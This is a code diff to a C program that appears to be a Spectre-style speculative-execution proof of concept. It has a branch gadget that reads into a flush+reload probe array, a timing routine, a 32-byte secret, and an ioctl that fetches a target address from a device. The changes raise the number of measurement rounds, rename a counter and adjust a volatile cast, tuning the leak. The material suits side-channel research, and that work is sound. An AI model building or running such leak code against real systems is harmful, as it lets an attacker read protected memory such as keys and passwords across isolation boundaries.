@@ -3,13 +3,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
-#include <fcntl.h>
-#include <setjmp.h>
-#include <signal.h>
 #include <unistd.h>
 
-#include <sched.h>
+#include <fcntl.h>
+
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 /* for ioctl */
@@ -27,7 +24,7 @@ wom_get_address(int fd) {
 	return addr;
 }
 
-#define NB_MEASUREMENTS 3
+#define NB_MEASUREMENTS 40
 #define PAGE_SIZE 4096
 #define SIZE_SECRET 32 //bytes
 
@@ -35,7 +32,7 @@ char *flush_reload;
 uint64_t results[256] = {0};
 uint64_t threshold    = 0;
 uint8_t k             = 0;
-uint32_t round        = 0;
+uint32_t rounds       = 0;
 
 uint8_t tmp;
 
@@ -43,7 +40,7 @@ volatile char *condition;
 
 static void spectre_func(volatile char *addr) {
 	if (*condition)
-		*(volatile char *)(&flush_reload[*addr * PAGE_SIZE]);
+		*(volatile char *)(&flush_reload[*(volatile char *)addr * PAGE_SIZE]);
 }
 
 static inline uint64_t __attribute__((always_inline)) time_access(const volatile char *addr) {
@@ -144,11 +141,11 @@ int main(int argc, char *argv[]) {
 		for (size_t j = 0; j < 256; j++)
 			results[j] = 0;
 
-		round = 0;
+		rounds = 0;
 
-		while (round < NB_MEASUREMENTS) {
+		while (rounds < NB_MEASUREMENTS) {
 
-			round++;
+			rounds++;
 			*condition = 1;
 
 			for (size_t j = 0; j < 40; j++) {
